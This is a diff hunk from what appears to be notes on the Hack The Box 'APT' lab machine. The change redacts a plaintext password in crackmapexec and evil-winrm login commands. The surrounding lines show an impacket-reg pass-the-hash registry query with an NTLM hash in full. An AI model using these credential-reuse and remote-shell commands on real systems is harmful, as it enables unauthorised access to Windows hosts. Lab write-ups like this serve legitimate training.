@@ -346,9 +346,9 @@ impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbff
 impacket-reg htb.local/henry.vinson@apt -hashes :e53d87d42adaa3ca32bdb34a876cbffb query -keyName HKCU\\Software\\GiganticHostingManagementSystem
 # :) Credentials !
 
-crackmapexec smb apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'      # :)
-crackmapexec winrm apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
-evil-winrm -i apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
+crackmapexec smb apt -u 'henry.vinson_adm' -p 'G...t'      # :)
+crackmapexec winrm apt -u 'henry.vinson_adm' -p 'G...t'
+evil-winrm -i apt -u 'henry.vinson_adm' -p 'G...t'
 
 whoami
 hostname
